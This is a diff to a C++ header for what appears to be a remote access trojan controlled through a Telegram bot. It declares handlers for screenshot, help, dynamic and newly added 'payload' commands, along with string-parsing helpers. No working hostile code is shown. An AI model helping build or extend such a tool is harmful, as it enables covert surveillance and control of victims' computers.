@@ -5,18 +5,25 @@
 #include "rat/tbot/types.hpp"
 #include "rat/networking.hpp"
 
+#include <string>
+#include <array>
+#include <vector>
+#include <cstdint>
+
 
 namespace rat::handler {
 
-
-
-
 class Handler {
 private:
+
+    //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
     tbot::Bot& bot;
     RatState state;
     
     rat::networking::Client curl_client;
+
+    rat::tbot::Update telegram_update;
+    Command command;
 
     struct CommandHandler {
         std::string command;
@@ -44,13 +51,9 @@ private:
         {"/help",         &Handler::handleHelpCommand}
     }};
     
-    rat::tbot::Update telegram_update;
-    Command command;
-    
-   
 
   // Parse Telegram message to command
-    Command parseTelegramMessageToCommand(void);
+    void parseTelegramMessageToCommand(void);
     
   // Command handler methods
     void handleScreenshotCommand();
@@ -78,17 +81,27 @@ private:
 
     void dispatchDynamicCommand();
 
+    void handlePayloadCommand(void);
+    
 public:
     Handler(rat::tbot::Bot& arg_Bot):
         bot(arg_Bot),
-        curl_client(){
-            this->state = RatState();
-            this->state.scanSystemPathsForUtilities();
-    } 
+        state(),
+        curl_client(),
+        telegram_update(),
+        command()
+        {} 
     // Handle Telegram update
     void handleUpdate(rat::tbot::Update&& arg_Update);
      
 };//class rat::handler::Handler
+
+void   __normalizeWhiteSpaces(std::string& String_Input);
+size_t __countWhiteSpaces(const std::string& String_Input);
+size_t  __findFirstOccurenceOfChar(const std::string& Input_String, char arg_C);
+uint16_t _stringToUint16(const std::string& str);
+std::vector<std::string> splitArguments(const std::string& Input_String);
+std::string stripQuotes(const std::string& Input_String);
 
 } // namespace rat::handler
 
